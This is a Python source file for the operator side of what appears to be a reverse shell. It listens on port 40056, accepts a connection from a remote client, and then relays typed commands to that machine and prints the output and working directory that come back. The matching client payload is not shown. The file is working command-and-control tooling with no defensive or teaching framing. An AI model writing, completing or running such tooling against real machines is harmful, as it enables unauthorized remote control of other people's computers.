import socket
import os
from time import sleep
import shutil
from threading import Thread

SEP = "<sep>"
suc_connection = False

class Server:
    def __init__(self, ip, port, BUFFER_SIZE):
        self.ip = ip
        self.port = port
        self.BUFFER_SIZE = BUFFER_SIZE

    def main(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        address = (self.ip,self.port)
        if self.ip and self.port:
            try:
                sock.bind(address)
                print(f"[*] listening for incomming connections on {address[0]}:{address[1]}...")
            except:
                act_host = socket.gethostbyname(socket.gethostname())
                new_address = (act_host,self.port)
                print(f"[!] couldnt bind to {self.ip}:{self.port} trying workaround...")
                sleep(0.8)
                try:
                    sock.bind(new_address)
                    print(f"[*] listening for incomming connections on {new_address[0]}:{new_address[1]}...")
                except:
                    pass
        sock.listen(5)
        conn, ip = sock.accept()
        print(f"connection recived from: '{ip[0]}'")
        sleep(0.8)
        client_cwd = conn.recv(self.BUFFER_SIZE).decode()
        print(f"current working directory: {client_cwd}\n")
        sleep(0.8)
        while True:
            cmd = input(f"{client_cwd}>")
            if not cmd.split():
                continue
            conn.send(cmd.encode())
            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "cls":
                os.system("cls" if os.name == "nt" else "clear")
            output = conn.recv(self.BUFFER_SIZE).decode()
            results, client_cwd = output.split(SEP)
            print(results)
            


if __name__ == "__main__":
    ipAddress = socket.gethostbyname(socket.gethostname())
    server = Server(ipAddress, 40056, 1024*3)
    server.main()


